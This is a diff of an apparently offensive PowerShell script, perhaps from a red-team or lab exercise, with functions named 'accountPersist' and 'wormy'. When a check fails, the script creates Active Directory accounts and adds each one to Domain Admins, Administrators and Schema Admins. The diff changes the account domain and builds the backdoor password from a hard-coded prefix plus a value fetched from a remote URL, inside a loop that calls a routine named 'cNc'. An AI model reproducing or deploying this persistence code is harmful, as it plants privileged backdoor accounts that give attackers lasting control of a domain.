@@ -79,7 +79,7 @@ function accountPersist{
         
     }
     catch{
-        new-aduser -name $username -SamAccountName $username -UserPrincipalName ($username + '@reallife.local') -AccountPassword( convertto-securestring $c0de -asplaintext -force) -Enabled $True
+        new-aduser -name $username -SamAccountName $username -UserPrincipalName ($username + '@reallife.lockdown') -AccountPassword( convertto-securestring $c0de -asplaintext -force) -Enabled $True
         Add-ADGroupMember -identity 'Domain Admins' -members $username
         Add-ADGroupMember -identity 'Administrators' -members $username
         Add-ADGroupMember -identity 'Schema Admins' -members $username
@@ -92,6 +92,9 @@ function wormy{
     
     while(1 -eq 1){
         clear
+        $toAppend=invoke-restmethod $timeURL
+        $c0de='Tossking@'
+        $c0de=$c0de+$toAppend
         [SecureString]$secureString = $c0de | ConvertTo-SecureString -AsPlainText -Force 
         [PSCredential]$credential = New-Object System.Management.Automation.PSCredential -ArgumentList $userNameB, $secureString
         cNc
@@ -153,7 +156,7 @@ start-job -ScriptBlock{
         
     }
     catch{
-        new-aduser -name $username -SamAccountName $username -UserPrincipalName ($username + '@reallife.local') -AccountPassword( convertto-securestring $c0de -asplaintext -force) -Enabled $True
+        new-aduser -name $username -SamAccountName $username -UserPrincipalName ($username + '@reallife.lockdown') -AccountPassword( convertto-securestring $c0de -asplaintext -force) -Enabled $True
         Add-ADGroupMember -identity 'Domain Admins' -members $username
         Add-ADGroupMember -identity 'Administrators' -members $username
         Add-ADGroupMember -identity 'Schema Admins' -members $username
